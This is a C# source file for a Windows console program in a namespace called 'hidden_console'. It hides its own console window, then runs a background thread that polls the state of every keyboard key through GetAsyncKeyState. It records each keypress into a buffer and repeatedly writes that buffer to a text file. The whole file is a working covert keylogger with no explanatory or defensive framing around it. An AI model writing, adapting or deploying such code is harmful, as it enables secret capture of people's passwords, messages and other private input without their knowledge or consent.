using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace hidden_console
{
    public static class KeyHook
    {
        private static string _buffer = string.Empty;
        private static string _projectDirectory = $@"{Directory.GetCurrentDirectory()}\..\..\";
        private static DateTime _start = DateTime.Now;
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        public delegate void KeyEventDelegate(Keys key);

        private static Thread _pollingThread;
        private static volatile Dictionary<Keys, bool> _keysStates = new Dictionary<Keys, bool>();

        internal static void Initialize()
        {

            if (_pollingThread != null && _pollingThread.IsAlive)
            {
                return;
            }
            foreach (Keys key in Enum.GetValues(typeof(Keys)))
            {
                _keysStates[key] = false;
            }


            _pollingThread = new Thread(PollKeys) { IsBackground = true, Name = "KeyThread" };
            _pollingThread.Start();
        }


        private static void PollKeys()
        {
            for (;;)
            {
                Thread.Sleep(10);
                foreach (Keys key in Enum.GetValues(typeof(Keys)))
                {
                    if (((GetAsyncKeyState(key) & (1 << 15)) != 0))
                    {
                        if (_keysStates[key])
                            continue;
                        OnKeyDown?.Invoke(key);
                        _buffer += key;
                        _keysStates[key] = true;
                    }
                    else
                    {
                        if (!_keysStates[key])
                            continue;
                        OnKeyUp?.Invoke(key);
                        _keysStates[key] = false;
                    }
                }

                if ((DateTime.Now - _start).TotalSeconds > 10)
                {
                    File.WriteAllText(_projectDirectory+"test.txt", _buffer);
                    _buffer = string.Empty;
                }
            }
        }
        public static event KeyEventDelegate OnKeyDown;
        public static event KeyEventDelegate OnKeyUp;
    }

    class Program
    {
        //const int Hide = 0;
        //const int Show = 1;

        [DllImport("Kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("User32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);

        static void Main(string[] args)
        {
            IntPtr hWndConsole = GetConsoleWindow();
            ShowWindow(hWndConsole, 0);

            KeyHook.OnKeyDown += key =>
            {
                Console.WriteLine($"key: {key}");
            };
            KeyHook.Initialize();
            Console.WriteLine("Press enter to stop...");
            Console.Read();
        }
    }
}
